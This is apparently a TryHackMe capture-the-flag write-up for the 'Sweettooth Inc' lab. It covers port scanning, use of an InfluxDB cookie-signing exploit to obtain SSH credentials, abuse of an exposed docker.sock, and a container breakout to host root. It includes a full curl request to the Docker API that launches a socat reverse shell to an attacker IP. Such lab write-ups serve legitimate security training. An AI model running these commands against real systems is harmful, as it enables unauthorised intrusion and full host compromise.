----------------

### CTF: TRYHACKME
### LAB: SWEETTOOTH INC

---------------------

![image](https://github.com/user-attachments/assets/87cdb8eb-e485-421b-a6fe-ba1ab4e4dfbd)

--------------------

### RECON

- Rustscan's output

      ❯ rustscan -a 10.10.5.0 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.5.0:111
      Open 10.10.5.0:2222
      Open 10.10.5.0:8086
      Open 10.10.5.0:37088
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-19 14:04 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 14:04
      Completed NSE at 14:04, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 14:04
      Completed NSE at 14:04, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 14:04
      Completed NSE at 14:04, 0.00s elapsed
      Initiating Ping Scan at 14:04
      Scanning 10.10.5.0 [2 ports]
      Completed Ping Scan at 14:04, 0.20s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 14:04
      Completed Parallel DNS resolution of 1 host. at 14:04, 0.04s elapsed
      DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 14:04
      Scanning 10.10.5.0 [4 ports]
      Discovered open port 111/tcp on 10.10.5.0
      Discovered open port 37088/tcp on 10.10.5.0
      Discovered open port 8086/tcp on 10.10.5.0
      Discovered open port 2222/tcp on 10.10.5.0
      Completed Connect Scan at 14:04, 0.17s elapsed (4 total ports)
      Initiating Service scan at 14:04
      Scanning 4 services on 10.10.5.0
      Completed Service scan at 14:05, 12.77s elapsed (4 services on 1 host)
      NSE: Script scanning 10.10.5.0.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 14:05
      Completed NSE at 14:05, 8.07s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 14:05
      Completed NSE at 14:05, 0.80s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 14:05
      Completed NSE at 14:05, 0.01s elapsed
      Nmap scan report for 10.10.5.0
      Host is up, received conn-refused (0.19s latency).
      Scanned at 2024-08-19 14:04:58 EDT for 22s
      
      PORT      STATE SERVICE REASON  VERSION
      111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
      | rpcinfo: 
      |   program version    port/proto  service
      |   100000  2,3,4        111/tcp   rpcbind
      |   100000  2,3,4        111/udp   rpcbind
      |   100000  3,4          111/tcp6  rpcbind
      |   100000  3,4          111/udp6  rpcbind
      |   100024  1          36282/udp6  status
      |   100024  1          37088/tcp   status
      |   100024  1          50155/tcp6  status
      |_  100024  1          51328/udp   status
      2222/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
      | ssh-hostkey: 
      |   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
      | ssh-dss AAAAB3NzaC1kc3MAAACBALOlP9Bx9VQxs4JDY8vovlJp+l+pPX2MGttzN2gGNYABXAVSF9CA14OituA5tcJd5/Nv3Ru3Xyu8Yo5SV0d82rd7L/NF5Relx+iiVF+bigo329wbV3wsIrRQGUYHXiMjAs8WqQR+XKjOm3q4QLVxe/jU1I1ddy6/xO4fL7nOSh3RAAAAFQDKuQDe9pQtmnqvJkZ7QuCGm31+vQAAAIBENh/MS3oHvz1tCC4nZYwdAYZMBj2It0gYCMvD0oSkqL9IMaP9DIt/5G3D9ARrZPeSP4CqhfryIGHS7t59RNdnc3ukEsfJPo23bPBwWdIW7HXp9XDqyY1kD6L3Tq0bpeXpeXt6FQ93rFxncZngFkCrMD4+YytS532qPHMPOWh75gAAAIA7TohVech8kWTh6KIMl2Y61s9cwUqwrTkqJIYMdZ73nP69FD0bw08vyrdAwtVnsqRaNzsVVz9sBOOz3wmp/ZNI5NiuyA0UwEcxPj5k6jCn620gBpMEzVy6a8Ih3yRYHoiVMrQ/PIuoeIGxeYGckCorv8jSz2O3pq1Fnz23FRPH2A==
      |   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbBmLBPg9mxkAdEbJGnz0v6Jzo4qdBcajkaIBKewKyz6OQTvyhVcDReSB2Dz0nl4mPCs3UN58hSNStCYXjZcpIBpqz2pHupVlqQ7u41Vo2W8u0nVFLt2U8JhTtA9wE6MA9GhitkN3Qorhxb3klCpSnWCDdcmkdNL0EYxZV53A52VWiNGX3vYkdMAKHAmp/VHvrsIeHozqflL8vD2UIoDmxDJwgXJRsr2iGVU1fL/Bu/DwlPwJkm50ua99yPpZbvCS9EwWki76aEtZSbcM4WHzx33Oe3tLXLCfKc9CJdIW35nBvpe5Dxl7gLR/mCHp2iTpdx1FmpSf+JjO/m2vKwL4X
      |   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHufHfqIZHVEKYC/yyNS+vTt35iULiIWoFNSQP/Bm/v90QzZjsYU9MSt7xdlR/2LZp9VWk32nl5JL65tvCMImxc=
      |   256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJEYHtE8GbpGSlNB+/3IWfYRFrkJB+N9SmKs3Uh14pPj
      8086/tcp  open  http    syn-ack InfluxDB http admin 1.3.0
      |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
      37088/tcp open  status  syn-ack 1 (RPC #100024)
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

-  Port `8086` hosts `Influxdb` ver 1.3.0 which has a critical vulnerability that allows an attacker to sign cookies of existing users.
  I  got an [exploit](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) to sign cookies.

- I enumerated users with this endpoint and got a user

  Endpoint:```http://<ip>:8086/debug/requests```

![image](https://github.com/user-attachments/assets/cca82fc0-3dd9-42ad-b57f-fe4f844cf4c3)


- Cookie
    
![image](https://github.com/user-attachments/assets/f45b4714-b7ad-4566-9cf3-508969455a92)

-----------------------

### SSH creds

- The host contains 5 dbs

![image](https://github.com/user-attachments/assets/1a8d90e5-94b5-471f-9824-d8ae616769ae)

- DB `creds` contains a column  `ssh`, I used the command `SHOW SERIES;` to check.

![image](https://github.com/user-attachments/assets/60a02c7e-8092-4fb5-b293-4e283168c6aa)

- Then I got the values of the column with `select * from ssh`.It contains a ssh credential.

![image](https://github.com/user-attachments/assets/fbd30a8c-b4d5-4504-a0d4-f3a82b320b92)

- SSH Access

![image](https://github.com/user-attachments/assets/e2f7ee5a-520a-4028-aa9b-e4d8edb8d16a)

---------------------------

### Docker Saga

- After mintutes of enumerating, I noticed that `socat` is listening on `port 8080` with a unix client`/var/lib/run/docker.sock` socket.

![image](https://github.com/user-attachments/assets/a95e3ef6-d2aa-402e-996b-777c0e786db8)

- I got a way to exploit the docker socket and gain root on the container from this [site](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html).

-----------------------

### Explaining the docker.sock vulnerability
`Docker.sock` is an example of unix socket with read,write, connect and bind capabilities. It allows connection to the docker daemon which receives API requests and solely manages container,images,volumes and networks.The docker.sock's unix socket allows us to communicate with the docker daemon for malicious purposes.

--------------------------

### Spawning a root rev shell

- We need an existing container to spawn our shell.Make a request to route `/containers/json` to get a list of containers.The container id is the target.

![image](https://github.com/user-attachments/assets/3b35fa05-62a7-4923-8ffe-6e848480bc48)

- Execute a shell payload with endpoint `/containers/[id]/exec`

      Cmd:curl http://localhost:8080/containers/[id]/exec -X POST -H  "Content-Type: application/json" -d '{"AttachStdin":false, "AttachStdout":true, "AttachStderr":true, "Tty":false, "Privileged":false, "Cmd":["socat","TCP:10.8.158.229:1337","EXEC:bash"]}'

![image](https://github.com/user-attachments/assets/158b2635-a7ca-494a-af43-1a206832f584)

- Start the rev shell container with endpoint `/containers/[id from the above cmd's output]/exec`

      Cmd: curl http://localhost:8080/exec/[id]/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'


- Container root shell,stabilize the shell with `script`

![image](https://github.com/user-attachments/assets/803e160e-bd8d-4ddc-9547-f3dd8da63b8d)

------------------------

### Docker breakout by mounting host partition

- After enumerating, I was able to mount a partition belonging to the host

![image](https://github.com/user-attachments/assets/70e459dc-9853-4f16-b451-c85d46f55df8)

- To access the host system as root, use `chroot <mount directory>`

  ![image](https://github.com/user-attachments/assets/15fbc04c-34c9-4bd4-be75-2dfb4a7785de)

- Root access

![image](https://github.com/user-attachments/assets/9f97cb75-6413-45f8-bf34-209ef52f0312)

-----------------------

### REFERENCES

- [Quarkslab's Docker.sock abuse](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
- [Dejandayoff's docker](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)
- [Influxdb](https://exploit-notes.hdks.org/exploit/database/influxdb-pentesting/)

------------------------

### THANKS FOR READING

